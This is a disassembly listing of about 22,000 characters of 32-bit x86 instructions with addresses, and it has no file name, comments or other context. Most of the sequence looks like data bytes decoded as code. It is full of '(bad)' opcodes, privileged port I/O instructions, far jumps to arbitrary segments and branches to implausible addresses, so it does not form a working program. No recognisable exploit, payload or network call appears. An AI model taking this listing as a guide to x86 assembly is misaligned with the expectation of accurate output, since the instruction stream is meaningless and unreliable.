  413976:	adc    ecx,0x11
  413979:	das    
  41397a:	jb     0x4139ad
  41397c:	sar    BYTE PTR [ebp+0x65711a8],0x6d
  413983:	sbb    BYTE PTR [esi+0x4f],ah
  413986:	ins    BYTE PTR es:[edi],dx
  413987:	sub    al,0x51
  413989:	push   cs
  41398a:	call   DWORD PTR [ecx]
  41398c:	sti    
  41398d:	mov    esp,0xba82d207
  413992:	dec    ebp
  413993:	inc    esp
  413994:	mov    BYTE PTR [edi+edx*1],0x92
  413998:	xchg   ecx,eax
  413999:	xor    DWORD PTR [ebx-0x76],edi
  41399c:	daa    
  41399d:	bound  ebx,QWORD PTR [ecx]
  41399f:	jecxz  0x413975
  4139a1:	cmp    eax,0xdb1504c7
  4139a6:	pop    esi
  4139a7:	sbb    al,cl
  4139a9:	push   cs
  4139aa:	cmp    al,0xe6
  4139ac:	jnp    0x41393b
  4139ae:	leave  
  4139af:	shl    esi,0x45
  4139b2:	add    BYTE PTR [ecx],ch
  4139b4:	xlat   BYTE PTR ds:[ebx]
  4139b5:	push   ebp
  4139b6:	ins    DWORD PTR es:[edi],dx
  4139b7:	pop    ecx
  4139b8:	xchg   ecx,eax
  4139b9:	nop
  4139ba:	cmp    edi,ebx
  4139bc:	ins    DWORD PTR es:[edi],dx
  4139bd:	sar    BYTE PTR [ebx],0x4a
  4139c0:	(bad)  
  4139c1:	xchg   esp,eax
  4139c2:	ret    0xfeff
  4139c5:	mov    edi,0xe45b1609
  4139ca:	ins    DWORD PTR es:[edi],dx
  4139cb:	or     cl,ah
  4139cd:	pop    ebx
  4139ce:	lods   eax,DWORD PTR ds:[esi]
  4139cf:	xchg   edi,eax
  4139d0:	xchg   edi,eax
  4139d1:	xchg   BYTE PTR [eax-0x1e],ch
  4139d4:	aaa    
  4139d5:	and    al,BYTE PTR [edi+esi*4+0x63cbf594]
  4139dc:	push   edx
  4139dd:	mov    bl,0x60
  4139df:	jmp    0x4afbe3cb
  4139e4:	test   BYTE PTR [edx],al
  4139e6:	in     eax,dx
  4139e7:	(bad)
  4139ea:	(bad)  
  4139eb:	mov    ebp,0x7df13fb9
  4139f0:	push   0xffffff9c
  4139f2:	dec    eax
  4139f3:	dec    ebp
  4139f4:	or     ecx,DWORD PTR [ecx]
  4139f6:	sbb    eax,0xe87d86ad
  4139fb:	fwait
  4139fc:	sbb    eax,0x6d7c2ab6
  413a01:	sub    DWORD PTR [esi],eax
  413a03:	mov    bl,0xca
  413a05:	into   
  413a06:	ins    BYTE PTR es:[edi],dx
  413a07:	lock cli 
  413a09:	jne    0x413a39
  413a0b:	popf   
  413a0c:	mov    DWORD PTR ds:[ecx],eax
  413a0f:	push   eax
  413a10:	jmp    0x34d:0x4b68c69d
  413a17:	fstp   st(4)
  413a19:	xchg   ebp,eax
  413a1a:	and    al,0xf8
  413a1c:	rcl    DWORD PTR [edi],1
  413a1e:	mov    edi,0x3212f26
  413a23:	imul   eax,DWORD PTR [esp],0xffffffd0
  413a27:	inc    ebp
  413a28:	sar    BYTE PTR [ebp+0x6384b540],1
  413a2e:	sub    al,0x75
  413a30:	cmp    ebp,DWORD PTR [edi+0x6f]
  413a33:	mov    ebx,0x29fca96
  413a38:	mov    DWORD PTR [esp+eax*2+0x4],esi
  413a3c:	xchg   esi,eax
  413a3d:	dec    eax
  413a3e:	dec    eax
  413a3f:	mov    ds:0xdbbb1259,al
  413a44:	cld    
  413a45:	nop
  413a46:	adc    BYTE PTR [ebx+0x37],0x2
  413a4a:	and    dh,dh
  413a4c:	xchg   esi,eax
  413a4d:	lock daa 
  413a4f:	bound  esp,QWORD PTR [eax+ebp*1]
  413a52:	cmp    dl,BYTE PTR [esi-0x6f]
  413a55:	jae    0x413a68
  413a57:	dec    DWORD PTR [ecx-0x14ac863c]
  413a5d:	dec    edi
  413a5e:	mov    eax,ds:0x7fcc3e5d
  413a63:	push   edx
  413a64:	aam    0x19
  413a66:	stc    
  413a67:	xor    cl,BYTE PTR [edi]
  413a69:	pop    ss
  413a6a:	dec    edx
  413a6b:	out    dx,al
  413a6c:	popa   
  413a6d:	mov    ds:0x98520737,al
  413a72:	xchg   BYTE PTR [esi+ecx*8],bh
  413a75:	aaa    
  413a76:	pop    ecx
  413a77:	sub    DWORD PTR [edx+edx*4],ebx
  413a7a:	mov    ds:0xec69c2c0,al
  413a7f:	jmp    0x77a23420
  413a84:	inc    eax
  413a85:	xchg   esi,eax
  413a86:	fsubr  QWORD PTR [edi]
  413a88:	pop    es
  413a89:	retf   
  413a8a:	sbb    al,0x9f
  413a8c:	adc    ebp,DWORD PTR [esi+0x36c6e22f]
  413a92:	jmp    0x413b03
  413a94:	xchg   esi,eax
  413a95:	imul   ecx,DWORD PTR ds:0x6029e155,0x6cc5341f
  413a9f:	add    ch,BYTE PTR [ebp-0x45]
  413aa2:	jbe    0x413a4a
  413aa4:	test   eax,0x126ecb24
  413aa9:	js     0x413a3a
  413aab:	loop   0x413a5f
  413aad:	(bad)  
  413aae:	sbb    al,0xd8
  413ab0:	jnp    0x413ae0
  413ab2:	cwde   
  413ab3:	and    al,BYTE PTR [esi-0x62]
  413ab6:	jp     0x413a44
  413ab8:	jecxz  0x413ad2
  413aba:	inc    edx
  413abb:	xchg   edx,eax
  413abc:	inc    esi
  413abd:	xchg   ebp,eax
  413abe:	add    al,0x81
  413ac0:	lods   eax,DWORD PTR ds:[esi]
  413ac1:	inc    esp
  413ac2:	hlt    
  413ac3:	bound  eax,QWORD PTR [ebp-0x4ee114de]
  413ac9:	pop    esp
  413aca:	pop    esp
  413acb:	push   esp
  413acc:	mov    ds:0xefc7a7a3,al
  413ad1:	fs fwait
  413ad3:	xor    edx,DWORD PTR [ebp+0x1767e776]
  413ad9:	ror    DWORD PTR [ebp-0x18],cl
  413adc:	dec    edi
  413add:	add    BYTE PTR [esp+ebp*4-0x320796b6],ah
  413ae4:	mov    ebp,0x8b5b7011
  413ae9:	dec    esp
  413aea:	test   al,0x59
  413aec:	inc    edx
  413aed:	retf   
  413aee:	mov    bh,cl
  413af0:	mov    edi,0xbce35991
  413af5:	mov    dl,0x57
  413af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413af8:	pop    ss
  413af9:	jp     0x413ae5
  413afb:	adc    DWORD PTR [ebp+ecx*4+0x6e8d77db],edx
  413b02:	shl    DWORD PTR ds:0xa7973240,0x2c
  413b09:	pop    edi
  413b0a:	daa    
  413b0b:	stos   DWORD PTR es:[edi],eax
  413b0c:	mov    bh,0xee
  413b0e:	imul   eax,DWORD PTR [ecx+0x69],0xc651d93e
  413b15:	icebp  
  413b16:	mov    bl,0xa2
  413b18:	daa    
  413b19:	and    BYTE PTR [edi+0x3d],dh
  413b1c:	mov    dh,0xf1
  413b1e:	icebp  
  413b1f:	push   edx
  413b20:	sbb    BYTE PTR [eax-0x5d5141e9],cl
  413b26:	fdivrp st(6),st
  413b28:	dec    esp
  413b29:	retf   
  413b2a:	sub    al,0x6c
  413b2c:	lds    esp,FWORD PTR [ebx-0x47]
  413b2f:	cld    
  413b30:	dec    eax
  413b31:	pusha  
  413b32:	mov    al,0xc1
  413b34:	ret    0xf159
  413b37:	lods   eax,DWORD PTR ds:[esi]
  413b38:	dec    ebx
  413b39:	ud0    ecx,DWORD PTR [edi+0x45427074]
  413b40:	imul   esi,DWORD PTR [ebx+0x3041f2cd],0xffffffa1
  413b47:	in     eax,dx
  413b48:	and    BYTE PTR [edx-0x2],cl
  413b4b:	xlat   BYTE PTR ds:[ebx]
  413b4c:	pop    ss
  413b4d:	xchg   BYTE PTR [ebp+0x3cc2369d],dh
  413b53:	jmp    0xe720314
  413b58:	out    0xcb,eax
  413b5a:	add    al,bl
  413b5c:	jle    0x413b9e
  413b5e:	pop    ebx
  413b5f:	arpl   WORD PTR [edi],si
  413b61:	(bad)  
  413b63:	mov    cl,0x1
  413b65:	(bad)  
  413b66:	inc    DWORD PTR [edi-0x31]
  413b69:	pop    esp
  413b6a:	ins    DWORD PTR es:[edi],dx
  413b6b:	sbb    al,0x17
  413b6d:	push   cs
  413b6e:	mov    gs,WORD PTR [eax]
  413b70:	mov    esp,0x48a5c123
  413b75:	jae    0x413b01
  413b77:	sar    DWORD PTR [eax],1
  413b79:	and    edi,DWORD PTR [ecx+0x63bbfac3]
  413b7f:	xchg   esp,eax
  413b80:	adc    ecx,edi
  413b82:	push   edi
  413b83:	mov    ah,0x74
  413b85:	dec    edi
  413b86:	push   es
  413b87:	add    al,BYTE PTR [ebx+0x56a2f670]
  413b8d:	xor    esi,DWORD PTR [ecx]
  413b8f:	mov    es,edi
  413b91:	ret    
  413b92:	or     edi,0x314f353c
  413b98:	add    eax,0x43071ce6
  413b9d:	inc    edi
  413b9e:	push   ecx
  413b9f:	test   DWORD PTR [esi+0x3f],edx
  413ba2:	add    BYTE PTR [ecx],dh
  413ba4:	jns    0x413c14
  413ba6:	and    eax,0xec483206
  413bab:	seto   BYTE PTR [eax]
  413bae:	jle    0x413bba
  413bb0:	daa    
  413bb1:	push   ss
  413bb2:	bound  ebp,QWORD PTR [esp+esi*1+0x56]
  413bb6:	xor    BYTE PTR [eax+esi*4-0x6e],0x98
  413bbb:	jl     0x413b88
  413bbd:	mov    al,0x32
  413bbf:	cwde   
  413bc0:	jg     0x413bbe
  413bc2:	pop    edi
  413bc3:	inc    ecx
  413bc4:	pop    ss
  413bc5:	aam    0x65
  413bc7:	lods   al,BYTE PTR ds:[esi]
  413bc8:	clc    
  413bc9:	push   cs
  413bca:	jg     0x413c25
  413bcc:	mov    edx,0x579711a
  413bd1:	cmp    BYTE PTR [ebx],dl
  413bd3:	(bad)  
  413bd4:	jb     0x413b5b
  413bd6:	jae    0x413b7e
  413bd8:	xor    BYTE PTR [ebx],cl
  413bda:	dec    edx
  413bdb:	push   ebx
  413bdc:	(bad)  
  413bdd:	outs   dx,DWORD PTR ds:[esi]
  413bde:	pop    ds
  413bdf:	pop    ecx
  413be0:	jo     0x413c00
  413be2:	je     0x413b85
  413be4:	add    BYTE PTR [ecx-0x2a],0x69
  413be8:	pop    edi
  413be9:	rcl    esp,cl
  413beb:	fwait
  413bec:	imul   ebx,edx,0xfffffffa
  413bef:	dec    edi
  413bf0:	(bad)  
  413bf1:	rol    bh,1
  413bf3:	sub    BYTE PTR [ecx-0x4a5e0bde],dh
  413bf9:	icebp  
  413bfa:	idiv   DWORD PTR [ebx-0x6321300d]
  413c00:	mov    ebx,0x5f1c4e6f
  413c05:	mov    al,ds:0x353aaa3a
  413c0a:	(bad)  
  413c0c:	ds mov esi,0x55c5f8b5
  413c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c13:	dec    ecx
  413c14:	cmp    ch,BYTE PTR [edi+esi*8+0x5d016c97]
  413c1b:	mov    DWORD PTR [esi+0x5c],edi
  413c1e:	(bad)  
  413c1f:	jp     0x413ba6
  413c21:	aad    0x25
  413c23:	mov    esi,0x242b6c1c
  413c28:	push   esp
  413c29:	dec    eax
  413c2a:	ins    BYTE PTR es:[edi],dx
  413c2b:	mov    edi,0xd3a33196
  413c31:	pop    ebp
  413c32:	scas   eax,DWORD PTR es:[edi]
  413c33:	mov    cl,0xa8
  413c35:	out    dx,al
  413c36:	nop
  413c37:	inc    edi
  413c38:	pop    edx
  413c39:	(bad)
  413c3c:	aam    0x5b
  413c3e:	aad    0x14
  413c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c41:	mov    al,ds:0xd77b6889
  413c46:	jge    0x413bff
  413c48:	jge    0x413bca
  413c4a:	add    BYTE PTR ds:0xc6eb669b,dl
  413c50:	in     eax,dx
  413c51:	or     eax,DWORD PTR [edi+0x490c6864]
  413c57:	(bad)  
  413c58:	js     0x413cba
  413c5a:	push   esp
  413c5b:	sti    
  413c5c:	dec    edi
  413c5d:	bound  edx,QWORD PTR [eax-0x68]
  413c60:	lods   eax,DWORD PTR ds:[esi]
  413c61:	loop   0x413c66
  413c63:	and    edi,DWORD PTR [edx+0x70]
  413c66:	dec    eax
  413c67:	sbb    eax,0x5c54be1a
  413c6c:	mov    edi,0x199163fd
  413c71:	add    ch,bl
  413c73:	in     eax,0x7b
  413c75:	jae    0x413c2c
  413c77:	test   ebp,ecx
  413c79:	(bad)  
  413c7a:	xor    al,0x26
  413c7c:	inc    esp
  413c7d:	in     eax,0x15
  413c7f:	popf   
  413c80:	outs   dx,BYTE PTR ds:[esi]
  413c81:	push   edx
  413c82:	mov    al,ds:0x1f1789d0
  413c87:	cld    
  413c88:	arpl   WORD PTR [ecx],dx
  413c8a:	push   ebx
  413c8b:	test   DWORD PTR [edx],ebx
  413c8d:	pop    ecx
  413c8e:	push   0xffffffe7
  413c90:	je     0x413c12
  413c92:	loope  0x413c4e
  413c94:	xor    DWORD PTR [esi+edx*1-0x5882be34],0x62197938
  413c9f:	ins    DWORD PTR es:[di],dx
  413ca1:	xchg   esi,eax
  413ca2:	fwait
  413ca3:	lds    esp,FWORD PTR ds:0x2f17fe5f
  413ca9:	pop    ss
  413caa:	mov    esp,0x881fbbbd
  413caf:	add    eax,0x13ab9b0b
  413cb4:	call   0xd6a81315
  413cb9:	repnz stc 
  413cbb:	mov    ebx,ebx
  413cbd:	retf   
  413cbe:	or     BYTE PTR [edi+0xe8eebb],dh
  413cc4:	sbb    eax,0x76cf09b1
  413cc9:	jne    0x413c4d
  413ccb:	fyl2x  
  413ccd:	sbb    dh,bh
  413ccf:	inc    ebx
  413cd0:	xchg   ecx,eax
  413cd1:	mov    BYTE PTR [edi+ebx*8+0x10],ch
  413cd5:	test   eax,0xd65d2d83
  413cda:	sar    BYTE PTR [edx+0x766e0d03],0x29
  413ce1:	cdq    
  413ce2:	loope  0x413cd9
  413ce4:	xchg   BYTE PTR [ecx],bh
  413ce6:	out    dx,eax
  413ce7:	pop    eax
  413ce8:	je     0x413cde
  413cea:	cdq    
  413ceb:	lods   eax,DWORD PTR ds:[esi]
  413cec:	sti    
  413ced:	sti    
  413cee:	xchg   esp,eax
  413cef:	add    esi,ecx
  413cf1:	adc    al,0xb
  413cf3:	retf   0x1798
  413cf6:	and    esi,esp
  413cf8:	xchg   ebp,eax
  413cf9:	cmp    eax,0x5309fe93
  413cfe:	xor    bh,BYTE PTR [ebx+0x1e]
  413d01:	inc    eax
  413d02:	inc    ecx
  413d03:	inc    ecx
  413d04:	test   al,0x93
  413d06:	jae    0x413d3f
  413d08:	jae    0x413d15
  413d0a:	imul   esi,DWORD PTR [eax-0x79432e68],0xffffffc1
  413d11:	enter  0x121e,0xb2
  413d15:	xor    DWORD PTR [edi-0x74],edi
  413d18:	je     0x413d90
  413d1a:	xor    BYTE PTR [edi+0x50b4099d],al
  413d20:	cmc    
  413d21:	fst    QWORD PTR [ebx-0xc]
  413d24:	mov    BYTE PTR [ebp-0x71],ch
  413d27:	sahf   
  413d28:	push   esp
  413d29:	mov    ds:0x5c6e6b18,al
  413d2e:	es or  eax,0xbf52b01b
  413d34:	in     al,dx
  413d35:	pop    ebx
  413d36:	jb     0x413cbd
  413d38:	(bad)  
  413d39:	aad    0x67
  413d3b:	xlat   BYTE PTR ds:[ebx]
  413d3c:	mov    bh,0xba
  413d3e:	cli    
  413d3f:	ds jne 0x413d33
  413d42:	cld    
  413d43:	stos   BYTE PTR es:[edi],al
  413d44:	mov    esi,0x5ca613a6
  413d49:	jp     0x413d38
  413d4b:	or     BYTE PTR [esi],bh
  413d4d:	inc    esp
  413d4e:	fst    DWORD PTR [edx]
  413d50:	inc    ebx
  413d51:	inc    esp
  413d52:	ss iret 
  413d54:	imul   esi,esp,0x19803c19
  413d5a:	push   edi
  413d5b:	inc    esi
  413d5c:	ja     0x413d9a
  413d5e:	or     ecx,DWORD PTR [eax]
  413d60:	push   eax
  413d61:	fidiv  DWORD PTR [esi+ebx*4+0x264ba35]
  413d68:	jno    0x413d85
  413d6a:	test   BYTE PTR [ecx+0x33],dh
  413d6d:	(bad)  
  413d6e:	cmp    eax,0x47543518
  413d73:	and    edi,esp
  413d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d76:	pushf  
  413d77:	jg     0x413d0a
  413d79:	xor    al,ah
  413d7b:	push   ss
  413d7c:	std    
  413d7d:	xor    al,0x18
  413d7f:	pusha  
  413d80:	push   esi
  413d81:	dec    edi
  413d82:	dec    esi
  413d83:	jl     0x413d8c
  413d85:	jle    0x413d6b
  413d87:	inc    eax
  413d88:	bound  esp,QWORD PTR [ecx]
  413d8a:	rcr    BYTE PTR [esi+edi*2-0x60],cl
  413d8e:	pop    ebx
  413d8f:	repz dec DWORD PTR [ebp+0x79]
  413d93:	sub    BYTE PTR [eax-0x18],dh
  413d96:	mov    esp,DWORD PTR [esi-0x6da3d543]
  413d9c:	mov    bl,ah
  413d9e:	repz ficom DWORD PTR [eax+0x16]
  413da2:	(bad)  
  413da3:	retf   0x1974
  413da6:	xor    al,ch
  413da8:	das    
  413da9:	adc    eax,0xc198e3d6
  413dae:	int    0xf8
  413db0:	ins    BYTE PTR es:[edi],dx
  413db1:	sub    BYTE PTR [ebp-0x7595eb64],dl
  413db7:	pop    edi
  413db8:	loope  0x413de3
  413dba:	xor    al,0x79
  413dbc:	stos   BYTE PTR es:[edi],al
  413dbd:	cmp    esi,DWORD PTR [ebx]
  413dbf:	mov    ah,0x52
  413dc1:	mov    al,ds:0xd23aea4b
  413dc6:	cs push ecx
  413dc8:	pop    eax
  413dc9:	ret    0xca6f
  413dcc:	imul   esi,DWORD PTR [eax+0x7bfa9f76],0x4b1f9d0c
  413dd6:	cmp    al,0x17
  413dd8:	add    eax,0x723da26a
  413ddd:	sub    al,0x3a
  413ddf:	enter  0xc69c,0xed
  413de3:	pop    edx
  413de4:	data16 js 0x413d76
  413de7:	in     eax,dx
  413de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de9:	jecxz  0x413d73
  413deb:	or     al,0x7d
  413ded:	(bad)  
  413dee:	hlt    
  413def:	and    BYTE PTR [edi+0x53],ah
  413df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413df3:	xor    eax,0x6fee58a
  413df8:	sub    ebx,DWORD PTR ss:[esi+0x5b]
  413dfc:	fdiv   DWORD PTR [edi-0x61f944be]
  413e02:	daa    
  413e03:	jno    0x413de4
  413e05:	pop    ss
  413e06:	cmp    al,0x63
  413e08:	lock and al,0xb7
  413e0b:	vphaddubw ymm13,xmm1
  413e10:	jno    0x413e38
  413e12:	sar    BYTE PTR ss:[ecx-0xae7b01d],1
  413e19:	mov    dh,0x65
  413e1b:	lds    edi,FWORD PTR [esi+0x1696e702]
  413e21:	cmc    
  413e22:	pop    ebp
  413e23:	or     eax,0xeef43eb6
  413e28:	or     DWORD PTR [edi],esi
  413e2a:	ins    BYTE PTR es:[edi],dx
  413e2b:	xchg   ecx,eax
  413e2c:	fist   DWORD PTR [ebx-0x7d54a8a4]
  413e32:	test   BYTE PTR [ebx-0x6b4f1129],dl
  413e38:	lock rcr cl,cl
  413e3b:	or     edx,DWORD PTR [ebp-0x71]
  413e3e:	imul   ebp,DWORD PTR [edi],0xb56e3035
  413e44:	sub    BYTE PTR [edi-0x29],0xfb
  413e48:	and    DWORD PTR [esi+0x7b8e6583],0x1b
  413e4f:	sub    DWORD PTR [ebp-0x25fd162e],edi
  413e55:	push   0xffffffb8
  413e57:	jmp    0x413eb0
  413e59:	mov    dl,0xeb
  413e5b:	mov    bh,0x2a
  413e5d:	cmp    BYTE PTR [edi+0x14],ch
  413e60:	mov    edi,0x3d24f144
  413e65:	push   esp
  413e66:	inc    esp
  413e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e68:	dec    ebx
  413e69:	dec    ecx
  413e6a:	fst    QWORD PTR [ecx+ebx*4]
  413e6d:	and    dl,BYTE PTR [edx]
  413e6f:	out    0x6,eax
  413e71:	xchg   esp,eax
  413e72:	pop    ebx
  413e73:	sub    DWORD PTR [ecx+0x30],0xffffff9f
  413e77:	adc    BYTE PTR [esi+0x7b],0x59
  413e7b:	jno    0x413eef
  413e7d:	inc    ebx
  413e7e:	or     bh,BYTE PTR [eax-0x19]
  413e81:	sbb    eax,0x48deda05
  413e86:	and    DWORD PTR [ecx-0x3a],ebp
  413e89:	ins    DWORD PTR es:[edi],dx
  413e8a:	lock mov ah,0x5b
  413e8e:	pop    eax
  413e8f:	jo     0x413e99
  413e91:	mov    ah,0xfd
  413e93:	aaa    
  413e94:	sbb    al,0xf3
  413e96:	adc    dl,BYTE PTR [edi-0x34c92614]
  413e9c:	out    0x8f,eax
  413e9e:	mov    al,0x8c
  413ea0:	and    BYTE PTR [eax+eiz*8+0x4631b913],ch
  413ea7:	hlt    
  413ea8:	out    0x8d,eax
  413eaa:	sub    bh,dl
  413eac:	xor    al,dl
  413eae:	fistp  QWORD PTR [edi+ebp*2-0x63]
  413eb2:	aam    0xe5
  413eb4:	sbb    ecx,esi
  413eb6:	add    esp,DWORD PTR [edi-0x7c8795e8]
  413ebc:	pop    ebp
  413ebd:	xchg   BYTE PTR [ebx],al
  413ebf:	cmp    edx,DWORD PTR [esi-0x2a8d6d9c]
  413ec5:	leave  
  413ec6:	cmp    al,BYTE PTR [esi]
  413ec8:	les    ecx,FWORD PTR [ebx+0x39]
  413ecb:	dec    edx
  413ecc:	in     eax,dx
  413ecd:	in     al,dx
  413ece:	pop    ss
  413ecf:	push   es
  413ed0:	shl    BYTE PTR [eax-0x1b],0x5e
  413ed4:	mov    esi,ebp
  413ed6:	jmp    FWORD PTR [ebp+eiz*8-0x7]
  413eda:	repnz pop edx
  413edc:	adc    DWORD PTR [ebp-0x43],ebp
  413edf:	shr    BYTE PTR [edx],cl
  413ee1:	test   eax,0x33801c29
  413ee6:	mov    edx,0xc848bad0
  413eeb:	xchg   DWORD PTR [esp+edi*2+0x14],edi
  413eef:	ror    ecx,0x35
  413ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ef3:	retf   
  413ef4:	into   
  413ef5:	out    dx,al
  413ef6:	dec    edx
  413ef7:	add    BYTE PTR ds:[ebx+0xf],0xc3
  413efc:	mov    bl,0xd5
  413efe:	mov    al,0xb5
  413f00:	push   0xe310e5b7
  413f05:	test   al,0xf2
  413f07:	mov    WORD PTR [esi+esi*1-0x76],?
  413f0b:	leave  
  413f0c:	test   eax,0x6c3ac31e
  413f11:	and    eax,0x94cbdf70
  413f16:	jmp    0x7acd:0x9005a5e3
  413f1d:	add    dh,BYTE PTR [esi+0x4c]
  413f20:	xchg   ebx,eax
  413f21:	mov    edi,0x548c7f09
  413f26:	xchg   ecx,eax
  413f27:	xor    ebp,ebx
  413f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f2a:	mov    ds,WORD PTR [ecx+0x17]
  413f2d:	retf   
  413f2e:	ss out dx,al
  413f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f31:	jmp    0x413eeb
  413f33:	imul   ecx,DWORD PTR [edi-0x3],0xffffffb4
  413f37:	dec    eax
  413f38:	sub    dl,BYTE PTR [ebp-0x1f7c9589]
  413f3e:	pop    esp
  413f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f40:	enter  0xcba0,0x78
  413f44:	or     ecx,DWORD PTR [esi]
  413f46:	aaa    
  413f47:	sub    BYTE PTR [ebp-0x2b],cl
  413f4a:	adc    eax,0x42aeace8
  413f4f:	(bad)  
  413f50:	pushf  
  413f51:	sbb    edx,DWORD PTR [edx-0x39dcc629]
  413f57:	iret   
  413f58:	out    0x74,eax
  413f5a:	outs   dx,DWORD PTR ds:[esi]
  413f5b:	dec    esp
  413f5c:	pop    ecx
  413f5d:	fistp  QWORD PTR [eax-0x1]
  413f60:	stos   BYTE PTR es:[edi],al
  413f61:	push   es
  413f62:	and    dl,BYTE PTR [edx+0x5e]
  413f65:	ja     0x413f9a
  413f67:	jo     0x413fa5
  413f69:	fiadd  DWORD PTR [esi+eiz*8-0x4f]
  413f6d:	idiv   DWORD PTR [edx-0x2b43bcee]
  413f73:	push   0xa9aba6cf
  413f78:	fs jmp 0xa85a:0xdc5ce16d
  413f80:	mov    esi,0xa6f35ad
  413f85:	cld    
  413f86:	stos   DWORD PTR es:[edi],eax
  413f87:	or     al,dh
  413f89:	sbb    dh,BYTE PTR [ecx+0x2c]
  413f8c:	jmp    0x2021:0xe3b292cd
  413f93:	daa    
  413f94:	mov    bl,0x1f
  413f96:	pop    esi
  413f97:	xchg   ebp,eax
  413f98:	mov    ecx,0xbd445180
  413f9d:	sub    eax,0x678d52df
  413fa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fa3:	and    bh,BYTE PTR [edi]
  413fa5:	push   cs
  413fa6:	mov    ds:0x41d511df,al
  413fab:	or     cl,BYTE PTR [ecx]
  413fad:	sahf   
  413fae:	inc    ebx
  413faf:	mov    eax,ds:0x483ebc6b
  413fb4:	mov    edx,0x55b2ba27
  413fb9:	xor    al,0xc3
  413fbb:	xor    ecx,DWORD PTR [ecx]
  413fbd:	and    BYTE PTR ds:0x49745c27,bl
  413fc3:	lods   al,BYTE PTR ds:[esi]
  413fc4:	add    esi,edi
  413fc6:	mov    eax,0x5c28ddae
  413fcb:	mov    eax,ds:0x5837e75a
  413fd0:	(bad)  
  413fd1:	aam    0x8f
  413fd3:	xchg   DWORD PTR [edi+0x364c3d06],eax
  413fd9:	cmc    
  413fda:	shr    BYTE PTR [edi-0x647bd616],1
  413fe0:	xchg   ebx,eax
  413fe1:	pushf  
  413fe2:	imul   esp,DWORD PTR [edx],0x725d5ca2
  413fe8:	push   ecx
  413fe9:	mov    edi,0xa4f7272
  413fee:	add    esi,DWORD PTR [ecx-0x71dcffd9]
  413ff4:	sbb    al,0x90
  413ff6:	mov    ecx,0xe66fdbb4
  413ffb:	sub    al,0x40
  413ffd:	inc    esi
  413ffe:	dec    eax
  413fff:	mov    dl,0x62
  414001:	xchg   edi,eax
  414002:	or     BYTE PTR [edx-0x585aeaaa],ah
  414008:	call   DWORD PTR [ebp-0x6]
  41400b:	sbb    cl,cl
  41400d:	xchg   BYTE PTR [ecx+0x3e29faab],al
  414013:	add    ch,BYTE PTR [ebp-0x80]
  414016:	xchg   bl,al
  414018:	push   edx
  414019:	xor    DWORD PTR [edi+ebp*2-0x2d],ebp
  41401d:	pop    ebp
  41401e:	test   al,0xa2
  414020:	adc    edi,eax
  414022:	xchg   edx,eax
  414024:	scas   al,BYTE PTR es:[edi]
  414025:	scas   eax,DWORD PTR es:[edi]
  414026:	jp     0x41400b
  414028:	repnz add edi,DWORD PTR [ecx+0x73]
  41402c:	and    BYTE PTR [ebp-0x7499aa2d],al
  414032:	jns    0x41404c
  414034:	(bad)  
  414035:	sub    eax,0x399ba049
  41403a:	sub    eax,DWORD PTR [edi+0x6c]
  41403d:	fdivr  DWORD PTR [ebx+eiz*8-0x1b9ee68b]
  414044:	xchg   esi,eax
  414045:	inc    edx
  414046:	loop   0x414039
  414048:	mov    WORD PTR [edx],es
  41404a:	push   esi
  41404b:	popf   
  41404c:	call   0x7224:0x891f3869
  414053:	or     DWORD PTR [ebp+0x316ae5d4],esi
  414059:	pop    ecx
  41405a:	fadd   QWORD PTR [ebx+0xc84f6ec]
  414060:	xor    cl,bh
  414062:	out    0xc7,eax
  414064:	rcl    DWORD PTR [esi-0x3d303ae4],0xb0
  41406b:	xor    al,0x67
  41406d:	fsubr  QWORD PTR [edx]
  41406f:	sub    bl,ah
  414071:	(bad)  
  414073:	shl    DWORD PTR [ebx],0xb8
  414076:	fimul  WORD PTR [eax+0x79]
  414079:	jb     0x4140f1
  41407b:	xchg   ebp,eax
  41407c:	imul   edi,DWORD PTR [eax],0xfffffffb
  41407f:	aaa    
  414080:	xor    DWORD PTR [esi],0x37
  414083:	push   edx
  414084:	das    
  414085:	jg     0x4140d3
  414087:	dec    eax
  414088:	into   
  414089:	xchg   esp,eax
  41408a:	jae    0x414107
  41408c:	push   edx
  41408d:	xchg   DWORD PTR [eax+0x56564e29],ebp
  414093:	sub    esi,ecx
  414095:	pop    esp
  414096:	rcl    DWORD PTR [ecx+0x6f],0x53
  41409a:	inc    edx
  41409b:	xchg   esp,eax
  41409c:	mov    BYTE PTR [edx+0x6],ah
  41409f:	daa    
  4140a0:	imul   eax,DWORD PTR [ebp-0x1bc507de],0xcf9c1a85
  4140aa:	mov    bh,0x1a
  4140ac:	jmp    0x3bc2:0xa62e3bdd
  4140b3:	jl     0x414129
  4140b5:	pop    ds
  4140b6:	sbb    eax,DWORD PTR [ecx+0xc17039f]
  4140bc:	test   BYTE PTR [ebx+ebp*2],0x27
  4140c0:	aaa    
  4140c1:	xchg   edi,eax
  4140c2:	ret    
  4140c3:	daa    
  4140c4:	es inc esi
  4140c6:	shr    DWORD PTR [esi+0x2826bf7],cl
  4140cc:	inc    edi
  4140cd:	mov    esi,0x8039ee2c
  4140d2:	mov    ebx,0xd0b39b44
  4140d7:	jmp    0x4140a8
  4140d9:	out    dx,al
  4140da:	fadd   QWORD PTR [eax+0x34cce321]
  4140e0:	dec    ecx
  4140e1:	jmp    0x7162:0x96889a16
  4140e8:	jb     0x414117
  4140ea:	sbb    eax,0xe9d0c76c
  4140ef:	imul   ebx,DWORD PTR [ebx-0x4415b9a6],0x7e
  4140f6:	loope  0x4140e8
  4140f8:	gs or  edi,edx
  4140fb:	mov    cs,WORD PTR [ecx]
  4140fd:	pop    ecx
  4140fe:	dec    eax
  4140ff:	sub    eax,0x6f1bb795
  414104:	aaa    
  414105:	loope  0x414135
  414107:	adc    eax,0xfa0ef131
  41410c:	aas    
  41410d:	xor    BYTE PTR [edx+0x6a],bl
  414110:	or     eax,0xab57d113
  414115:	xchg   edx,eax
